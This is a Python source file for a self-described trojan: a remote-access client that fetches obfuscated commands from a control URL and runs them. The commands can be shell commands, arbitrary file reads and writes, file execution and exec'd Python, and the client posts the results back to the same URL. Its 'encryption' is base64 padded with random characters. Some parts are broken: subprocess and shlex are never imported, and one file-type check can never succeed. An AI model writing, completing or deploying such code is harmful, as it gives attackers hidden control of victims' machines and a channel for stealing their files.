import urllib.request as request
import urllib.parse as parse
from urllib.parse import quote, unquote

import json
import os
import sys
import random
import base64
import platform



"""encryption algorithms"""
def encrypt(plaintext: str) -> str:
    #add random charecters to plaintext- still no encryption
    randomtext = ''
    for i in range(len(plaintext)):
        randomtext += plaintext[i]
        randomtext += chr(random.randint(33, 126))
    #convert randomtext to binary
    binarytext = ''.join(format(ord(i), '08b') for i in randomtext)
    binarytext = binarytext
    #convert binary to base64
    base64text = str(base64.b64encode(binarytext.encode('utf-8')))[2:-1] 
    #adds random charecters to base64
    randombase64text = ''
    for i in range(len(str(base64text))):
        randombase64text  += str(base64text)[i]
        randombase64text  += chr(random.randint(33, 126))
    html = ('<!doctype html><body>^%s^</body></doctype>' % randombase64text)
    return html


def decrypt(html : str) -> str:
    #remove html
    start = html.find('^') + 1
    end = -(html[::-1].find('^') +1)
    base64text = html[start:end]
    #removes random charecters
    base64text_norandom = base64text[::2]
    #decode from base64
    binarytext = base64.b64decode(base64text_norandom.encode('latin-1'))
    #converts from binary to text
    randomtext = ''.join(chr(int(binarytext[i*8:i*8+8],2)) for i in range(len(binarytext)//8))
    #extract plaintext
    plaintext = randomtext[::2]
    return plaintext




"""powerhouse of trojan horse"""
class Trojan:
    def __init__(self, commandurl,\
                useragent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',\
                computerid = 'None', **headers):
        self.commandurl = commandurl
        self.useragent = useragent
        self.computerid = computerid
        self.headers = {'computer-id':self.computerid, 'User-agent' : self.useragent}
        self.headers.update(headers) #concatenates two dictionaries
    
    def commands(self) -> dict:
        print('[*] <- recieving commands')
        req = request.Request(self.commandurl, headers = self.headers)
        with request.urlopen(req) as response:
            encryptedresponse = response.read()
            encryptedresponse = encryptedresponse.decode()
        decryptedresponse = decrypt(encryptedresponse)
        commands = ''
        try:
            commands = json.loads(decryptedresponse)
        except json.JSONDecodeError:
            decryptedresponse = decryptedresponse.replace('\'', '"')
            commands = json.loads(decryptedresponse)
        return commands
    
    def sendoutcome(self, outcome: dict) -> str:
        print('[*] -> sending ', outcome)
        data = parse.quote(encrypt(str(outcome))).encode('utf-8')
        req = request.Request(self.commandurl, data=data, headers = self.headers)
        with request.urlopen(req) as response:
            response = response.read().decode()
        return response
            
    def run(self):
        """
        |cmd- run commands from cmd- input is [*commands], output is [*outcome]
        |file-read- read a file from computer- input is [*files], output is [*[file name, content/error]]
        |file-write- write files to computer- input is [*[file name, file content]], output is [*[file name, errors]]
        |file-run- run files on computer- input is [*files], output is [*[file name, errors]]
        |python- run a python command- input is [*commands], output is [*[command, outcome]]
        """
        commands = self.commands()
        outcomes = {'cmd' : [], 'file-read' : [], 'file-write' : [], 'file-run' : [], 'python' : []}
        for key, values in commands.items():
            if key.lower() == 'cmd':
                for cmd in values: #just keeps running seemingly random values
                    output = str(os.popen(cmd).read())
                    if output == -1 or output == 1:
                        try:
                            output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
                        except Exception as e:
                            output = e
                    outcomes['cmd'].append([ cmd, output])
            elif key.lower() == 'file-read':
                for value in values:
                    try:
                        with open(value, 'r') as file:
                            content = file.read()
                    except Exception as e:
                        content = e
                    outcomes['file-read'].append([value, content])
            elif key.lower() == 'file-write':
                for value in values:
                    errors = None
                    try:
                        with open(value[0], 'w') as file:
                            file.write(value[1])
                    except Exception as e:
                        errors = e
                    outcomes['file-write'].append([value[0], errors])
            elif key.lower() == 'file-run':
                for value in values:
                    filetype = value.split('.')[-1]
                    if filetype == '.py': filetype = 'python'
                    #add other filetype checks here
                    output = ''
                    if '.' not in filetype: #been converted correctly
                        try:
                            output +=subprocess.check_output(shlex.split('%s %s' %(filetype, value)), stderr=subprocess.STDOUT).decode()
                        except Exception as e:
                            output += str(e)
                    else:
                        output += '\n\n[*] Invalid file type\n\n'
                    outcomes['file-run'].append([value, output])
            elif key.lower() == 'python':
                for value in values:
                    try:
                        if '()' in value:
                            loc = {}
                            exec('output = %s' % value, globals(), loc)
                            output = loc['output']
                        else:
                            exec(value)
                            output = ('executed "%"s correctly' % value)
                    except Exception as e:
                        output = e
                    outcomes['python'].append([value, output])
        outcomes = str(outcomes)
        self.sendoutcome(outcomes)
        
if __name__ == '__main__':
    trojan = Trojan('http://127.0.0.1:8000', computerid='dht-11')
    while True:
        input('Enter to run')
        trojan.run()
